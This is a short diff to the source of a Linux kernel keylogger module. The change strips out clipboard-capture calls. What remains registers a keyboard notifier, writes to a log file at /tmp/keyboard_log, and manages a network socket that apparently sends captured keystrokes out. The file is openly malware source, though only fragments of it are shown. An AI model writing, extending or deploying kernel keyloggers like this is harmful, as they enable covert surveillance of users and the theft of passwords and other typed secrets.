@@ -1,7 +1,6 @@
 #include "struct_keylogger.h"
 #include "keyboard_callback.h"
 #include "write_to_file.h"
-#include "clipboard.h"
 #include <linux/ktime.h>
 
 #define LOG_FILE_PATH "/tmp/keyboard_log"
@@ -63,11 +62,10 @@ static int __init keyboard_logger_init(void)
         sock_release(keylogger->socket);
         return -ECONNREFUSED;
     }
+    
 
     register_keyboard_notifier(&keylogger->key_notifier);
 
-    
-     init_clipboard();
 
    
 
@@ -87,7 +85,6 @@ static void __exit keyboard_logger_exit(void) {
         }
         if (keylogger->socket)
             sock_release(keylogger->socket);
-        cleanup_clipboard();
         // Eliberează memoria
         kfree(keylogger);
     }
